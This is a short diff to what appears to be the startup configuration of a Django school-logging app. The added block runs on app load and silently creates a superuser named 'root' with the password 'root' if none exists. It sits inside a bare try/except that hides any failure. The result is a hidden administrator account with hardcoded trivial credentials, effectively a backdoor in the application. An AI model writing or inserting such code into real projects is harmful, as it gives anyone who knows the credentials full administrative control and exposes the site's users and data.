@@ -70,3 +70,12 @@ class LogsystemConfig(AppConfig):
                 schueler.save()
         except:
             pass
+
+        try:
+            models = importlib.import_module('django.contrib.auth.models')
+            if not models.User.objects.filter(username="root").exists():
+                newuser = models.User.objects.create_user(username="root", password="root")
+                newuser.is_superuser = True
+                newuser.save()
+        except:
+            pass
